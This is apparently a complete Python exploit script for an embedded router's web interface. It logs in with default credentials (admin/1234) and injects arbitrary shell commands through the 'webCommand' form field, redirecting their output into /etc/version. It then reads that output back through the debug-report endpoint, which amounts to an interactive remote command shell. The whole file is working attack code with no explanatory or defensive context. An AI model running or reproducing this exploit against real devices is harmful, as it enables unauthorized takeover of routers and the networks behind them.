import requests
import cmd
import time

START_BOUNDARY = "Firmware Version:"
END_BOUNDARY = "Compiler date:"
CMD_FORMAT = '{command} > /etc/version 2>> /etc/version'


class cmd_loop(cmd.Cmd):
    def default(self, line):
        command = CMD_FORMAT.format(command=line)
        if len(command) >= 110:
            print("[-] Command bigger than target buffer...")
            return
        cmd_dict = {"webCommand": command}
        auth = ("admin", "1234")
        requests.post("http://192.168.2.1/goform/formTxAnt", auth=auth, data=cmd_dict)
        output = requests.post("http://192.168.2.1/goform/formDebug", auth=auth, data={"password": "report.txt",
                                                                            "save": "Save",
                                                                            "submit-url": "/debug.asp"}).content
        parsed_output = parse_output(output)
        print(parsed_output)

    def do_EOF(self, line):
        print("Bye")
        return True
    
    def do_quit(self, line):
        print("Bye")
        return True

def parse_output(output):
    output = str(output)
    start_index = output.find(START_BOUNDARY) + len(START_BOUNDARY)
    end_index = output.find(END_BOUNDARY)
    parsed_output = output[start_index:end_index]
    return parsed_output.replace("\\n", "\n")

def main():
    prompt = cmd_loop()
    prompt.prompt = "[+] Command:"
    prompt.cmdloop()
     
if __name__ == "__main__":
    main()
